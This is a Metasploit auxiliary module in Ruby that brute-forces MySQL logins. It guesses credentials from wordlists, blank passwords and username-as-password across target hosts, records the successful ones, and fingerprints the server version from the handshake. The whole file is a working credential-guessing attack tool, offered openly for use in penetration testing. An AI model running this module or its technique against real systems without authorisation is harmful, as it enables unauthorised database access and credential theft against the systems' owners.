##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mysql'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'MySQL Login Utility',
      'Description'	=> 'This module simply queries the MySQL instance for a specific user/pass (default is root with blank).',
      'Author'		=> [ 'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>' ],
      'License'		=> MSF_LICENSE,
      'References'      =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ]
    ))

    register_options(
      [
        Opt::Proxies
      ])

    deregister_options('PASSWORD_SPRAY')
  end

  def target
    [rhost,rport].join(":")
  end


  def run_host(ip)
    begin
      if mysql_version_check("4.1.1") # Pushing down to 4.1.1.
        cred_collection = Metasploit::Framework::CredentialCollection.new(
            blank_passwords: datastore['BLANK_PASSWORDS'],
            pass_file: datastore['PASS_FILE'],
            password: datastore['PASSWORD'],
            user_file: datastore['USER_FILE'],
            userpass_file: datastore['USERPASS_FILE'],
            username: datastore['USERNAME'],
            user_as_pass: datastore['USER_AS_PASS'],
        )

        cred_collection = prepend_db_passwords(cred_collection)

        scanner = Metasploit::Framework::LoginScanner::MySQL.new(
            host: ip,
            port: rport,
            proxies: datastore['PROXIES'],
            cred_details: cred_collection,
            stop_on_success: datastore['STOP_ON_SUCCESS'],
            bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
            connection_timeout: 30,
            max_send_size: datastore['TCP::max_send_size'],
            send_delay: datastore['TCP::send_delay'],
            framework: framework,
            framework_module: self,
            ssl: datastore['SSL'],
            ssl_version: datastore['SSLVersion'],
            ssl_verify_mode: datastore['SSLVerifyMode'],
            ssl_cipher: datastore['SSLCipher'],
            local_port: datastore['CPORT'],
            local_host: datastore['CHOST']
        )

        scanner.scan! do |result|
          credential_data = result.to_h
          credential_data.merge!(
              module_fullname: self.fullname,
              workspace_id: myworkspace_id
          )
          if result.success?
            credential_core = create_credential(credential_data)
            credential_data[:core] = credential_core
            create_credential_login(credential_data)

            print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
          else
            invalidate_login(credential_data)
            vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
          end
        end

      else
        vprint_error "#{target} - Unsupported target version of MySQL detected. Skipping."
      end
    rescue ::Rex::ConnectionError, ::EOFError => e
      vprint_error "#{target} - Unable to connect: #{e.to_s}"
    end
  end

  # Tmtm's rbmysql is only good for recent versions of mysql, according
  # to http://www.tmtm.org/en/mysql/ruby/. We'll need to write our own
  # auth checker for earlier versions. Shouldn't be too hard.
  # This code is essentially the same as the mysql_version module, just less
  # whitespace and returns false on errors.
  def mysql_version_check(target="5.0.67") # Oldest the library claims.
    begin
      s = connect(false)
      data = s.get
      disconnect(s)
    rescue ::Rex::ConnectionError, ::EOFError => e
      raise e
    rescue ::Exception => e
      vprint_error("#{rhost}:#{rport} error checking version #{e.class} #{e}")
      return false
    end
    offset = 0
    l0, l1, l2 = data[offset, 3].unpack('CCC')
    return false if data.length < 3
    length = l0 | (l1 << 8) | (l2 << 16)
    # Read a bad amount of data
    return if length != (data.length - 4)
    offset += 4
    proto = data[offset, 1].unpack('C')[0]
    # Error condition
    return if proto == 255
    offset += 1
    version = data[offset..-1].unpack('Z*')[0]
    report_service(:host => rhost, :port => rport, :name => "mysql", :info => version)
    short_version = version.split('-')[0]
    vprint_good "#{rhost}:#{rport} - Found remote MySQL version #{short_version}"
    int_version(short_version) >= int_version(target)
  end

  # Takes a x.y.z version number and turns it into an integer for
  # easier comparison. Useful for other things probably so should
  # get moved up to Rex. Allows for version increments up to 0xff.
  def int_version(str)
    int = 0
    begin # Okay, if you're not exactly what I expect, just return 0
      return 0 unless str =~ /^[0-9]+\x2e[0-9]+/
      digits = str.split(".")[0,3].map {|x| x.to_i}
      digits[2] ||= 0 # Nil protection
      int =  (digits[0] << 16)
      int += (digits[1] << 8)
      int += digits[2]
    rescue
      return int
    end
  end



end
